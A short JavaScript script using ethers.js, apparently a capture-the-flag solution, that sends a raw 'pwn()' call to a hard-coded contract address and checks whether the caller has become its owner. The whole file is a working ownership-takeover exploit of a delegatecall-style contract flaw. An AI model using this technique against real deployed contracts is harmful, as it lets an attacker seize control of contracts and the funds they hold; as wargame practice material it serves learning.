const ethers = require('ethers');

const { signer } = require('../utils/init');

const INSTANCE_ADDRESS = '0x4D8bfa99d46F2b118C01fBddBB46e5Aed9e6aEEE';

const main = async () => {
    const iface = new ethers.utils.Interface(['function pwn()']);
    const signature = iface.getSighash('pwn');

    const tx = {
        to: INSTANCE_ADDRESS,
        value: 0,
        data: signature,
        gasLimit: 100000,
    };

    const sentTx = await signer.sendTransaction(tx);
    await sentTx.wait();

    const target = new ethers.Contract(
        INSTANCE_ADDRESS,
        ['function owner() public view returns (address)'],
        signer
    );

    const owner = await target.owner();

    if (signer.address == owner) {
        console.log('Success!');
    } else {
        console.log('Something went wrong.');
    }
};

main();
